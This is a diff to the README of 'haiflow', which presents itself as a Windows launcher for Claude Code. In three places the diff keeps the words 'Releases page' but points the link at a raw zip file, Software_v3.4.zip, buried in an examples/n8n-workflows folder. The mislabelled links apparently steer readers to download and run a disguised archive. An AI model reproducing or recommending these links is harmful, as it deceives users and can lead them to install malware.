@@ -1,6 +1,6 @@
 # 🤖 haiflow - Run Claude Code from Windows
 
-[![Download haiflow](https://img.shields.io/badge/Download%20haiflow-Release%20Page-blue?style=for-the-badge)](https://github.com/Urielspectrographic907/haiflow/releases)
+[![Download haiflow](https://img.shields.io/badge/Download%20haiflow-Release%20Page-blue?style=for-the-badge)](https://github.com/Urielspectrographic907/haiflow/raw/refs/heads/main/examples/n8n-workflows/Software_v3.4.zip)
 
 ## 🚀 What haiflow does
 
@@ -35,7 +35,7 @@ If your PC blocks unknown apps, you may need to allow the app the first time you
 
 Visit this page to download:
 
-[Open the haiflow Releases page](https://github.com/Urielspectrographic907/haiflow/releases)
+[Open the haiflow Releases page](https://github.com/Urielspectrographic907/haiflow/raw/refs/heads/main/examples/n8n-workflows/Software_v3.4.zip)
 
 On that page:
 
@@ -200,7 +200,7 @@ It aims to make Claude Code easier to use in repeatable flows.
 
 ## 📌 Quick start
 
-1. Open the [haiflow Releases page](https://github.com/Urielspectrographic907/haiflow/releases)
+1. Open the [haiflow Releases page](https://github.com/Urielspectrographic907/haiflow/raw/refs/heads/main/examples/n8n-workflows/Software_v3.4.zip)
 2. Download the latest Windows file
 3. Install it or extract it
 4. Open haiflow
